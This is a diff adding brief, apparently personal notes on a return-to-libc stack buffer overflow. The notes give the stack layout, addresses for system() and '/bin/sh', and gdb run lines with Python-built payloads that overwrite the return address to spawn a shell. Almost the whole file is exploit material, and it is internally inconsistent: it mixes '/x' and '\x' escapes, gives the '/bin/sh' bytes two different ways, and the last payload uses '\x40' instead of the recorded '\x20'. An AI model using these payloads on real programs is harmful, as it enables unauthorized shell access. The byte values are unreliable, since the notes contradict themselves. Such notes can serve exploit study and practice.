@@ -1,0 +1,25 @@
+BUF(36) + SFP(4) + RET(4) -> 
+
+push ebx -> 4byte (buf(36))
+
+Exlpoit -> BUF(40) + RET(system) + Dummy(4) + Argv("/bin/sh")
+
+
+
+r $(python -c 'print "A"*40+"BBBB"+"CCCC"+"DDDD"')
+
+
+system function : 0xf7e0f620 -> /x20/xf6/xe0/xf7
+0xf7e0f620
+0xf7e0f620 -> \x20\xf6\xe0\xf7
+
+"/bin/sh" : 0xf7f53406 ->
+0xf7f53406 -> \x06\x34\xf5\xf7 
+/x06/x34/x53/xf7
+
+
+r $(python -c 'print "A"*40+"/x20/xf6/xe0/xf7"+"CCCC"+"/x06/x34/x53/xf7"')
+
+
+r $(python -c 'print "A"*40+"\x40\xf6\xe0\xf7"+"CCCC"+"\x06\x34\xf5\xf7"')
+
